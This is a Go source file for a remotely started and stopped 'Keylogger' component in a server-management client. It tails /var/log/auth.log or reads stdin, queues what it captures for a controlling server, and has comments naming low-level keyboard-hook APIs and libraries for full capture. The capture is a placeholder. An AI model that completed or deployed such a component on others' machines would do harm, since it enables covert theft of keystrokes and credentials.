package client

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"runtime"
	"sync"
	"time"

	"mww2.com/server_manager/common"
)

// Keylogger handles keyboard input monitoring
type Keylogger struct {
	running  bool
	target   string
	savePath string
	logFile  *os.File
	mu       sync.Mutex
	stopChan chan bool
	dataChan chan string
}

// NewKeylogger creates a new keylogger
func NewKeylogger() *Keylogger {
	return &Keylogger{
		stopChan: make(chan bool),
		dataChan: make(chan string, 100),
	}
}

// Start starts the keylogger
func (kl *Keylogger) Start(payload *common.KeyloggerPayload) error {
	kl.mu.Lock()
	defer kl.mu.Unlock()

	if kl.running {
		return fmt.Errorf("keylogger already running")
	}

	kl.target = payload.Target
	kl.savePath = payload.SavePath
	kl.running = true

	// Open log file
	if kl.savePath != "" {
		var err error
		kl.logFile, err = os.OpenFile(kl.savePath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
		if err != nil {
			kl.running = false
			return err
		}
	}

	// Start monitoring based on target
	switch kl.target {
	case "ssh":
		go kl.monitorSSH()
	case "rdp":
		go kl.monitorRDP()
	case "monitor":
		go kl.monitorGeneral()
	default:
		kl.running = false
		if kl.logFile != nil {
			kl.logFile.Close()
		}
		return fmt.Errorf("unknown target: %s", kl.target)
	}

	log.Printf("Keylogger started for target: %s", kl.target)
	return nil
}

// Stop stops the keylogger
func (kl *Keylogger) Stop() error {
	kl.mu.Lock()
	defer kl.mu.Unlock()

	if !kl.running {
		return fmt.Errorf("keylogger not running")
	}

	kl.running = false
	close(kl.stopChan)

	if kl.logFile != nil {
		kl.logFile.Close()
		kl.logFile = nil
	}

	log.Printf("Keylogger stopped")
	return nil
}

// IsRunning returns whether the keylogger is running
func (kl *Keylogger) IsRunning() bool {
	kl.mu.Lock()
	defer kl.mu.Unlock()
	return kl.running
}

// GetData returns captured keylogger data
func (kl *Keylogger) GetData() *common.KeyloggerDataPayload {
	select {
	case data := <-kl.dataChan:
		return &common.KeyloggerDataPayload{
			Target:    kl.target,
			Keys:      data,
			Timestamp: time.Now(),
		}
	default:
		return nil
	}
}

// logKeys logs keystrokes to file and channel
func (kl *Keylogger) logKeys(keys string) {
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] %s\n", timestamp, keys)

	// Write to file
	if kl.logFile != nil {
		kl.logFile.WriteString(logEntry)
		kl.logFile.Sync()
	}

	// Send to channel
	select {
	case kl.dataChan <- keys:
	default:
		// Channel full, skip
	}
}

// monitorSSH monitors SSH sessions
func (kl *Keylogger) monitorSSH() {
	// Note: This is a simplified implementation
	// In production, you would need to hook into SSH session logs or use ptrace

	log.Printf("SSH monitoring started (basic implementation)")

	// Monitor SSH-related log files on Linux
	if runtime.GOOS == "linux" {
		kl.monitorLogFile("/var/log/auth.log")
	} else {
		log.Printf("SSH monitoring not fully implemented for %s", runtime.GOOS)
	}
}

// monitorRDP monitors RDP sessions
func (kl *Keylogger) monitorRDP() {
	// Note: This is a simplified implementation
	// On Windows, you would monitor RDP session events

	log.Printf("RDP monitoring started (basic implementation)")

	if runtime.GOOS == "windows" {
		// Monitor Windows Event Logs for RDP events
		// This would require Windows-specific APIs
		log.Printf("RDP monitoring requires Windows Event Log APIs")
	} else {
		log.Printf("RDP monitoring only available on Windows")
	}
}

// monitorGeneral provides general keyboard monitoring
func (kl *Keylogger) monitorGeneral() {
	// Note: This is a simplified implementation
	// Real keyboard monitoring requires low-level hooks:
	// - Windows: SetWindowsHookEx
	// - Linux: /dev/input/eventX or X11 hooks
	// - macOS: CGEventTap

	log.Printf("General monitoring started (basic implementation)")
	log.Printf("WARNING: Full keyboard monitoring requires platform-specific low-level APIs")

	// Placeholder: Monitor stdin for demonstration
	// In production, use platform-specific keyboard hooks
	kl.monitorStdin()
}

// monitorStdin monitors standard input (for demonstration)
func (kl *Keylogger) monitorStdin() {
	scanner := bufio.NewScanner(os.Stdin)

	for {
		select {
		case <-kl.stopChan:
			return
		default:
			if scanner.Scan() {
				text := scanner.Text()
				if text != "" {
					kl.logKeys(text)
				}
			}
		}
	}
}

// monitorLogFile monitors a log file for changes
func (kl *Keylogger) monitorLogFile(filename string) {
	file, err := os.Open(filename)
	if err != nil {
		log.Printf("Failed to open log file %s: %v", filename, err)
		return
	}
	defer file.Close()

	// Seek to end of file
	file.Seek(0, os.SEEK_END)

	scanner := bufio.NewScanner(file)
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-kl.stopChan:
			return
		case <-ticker.C:
			for scanner.Scan() {
				line := scanner.Text()
				if line != "" {
					kl.logKeys(line)
				}
			}
		}
	}
}

// Note: For production use, you would implement platform-specific keyboard hooks:
//
// Windows: Use SetWindowsHookEx with WH_KEYBOARD_LL
// import "golang.org/x/sys/windows"
//
// Linux: Monitor /dev/input/eventX or use X11 hooks
// import "github.com/MarinX/keylogger"
//
// macOS: Use CGEventTap
// import "github.com/MarinX/keylogger"
//
// These require CGO and platform-specific build constraints.
// For a complete implementation, consider using existing libraries like:
// - github.com/MarinX/keylogger (Linux)
// - github.com/kindlyfire/go-keylogger (Windows)
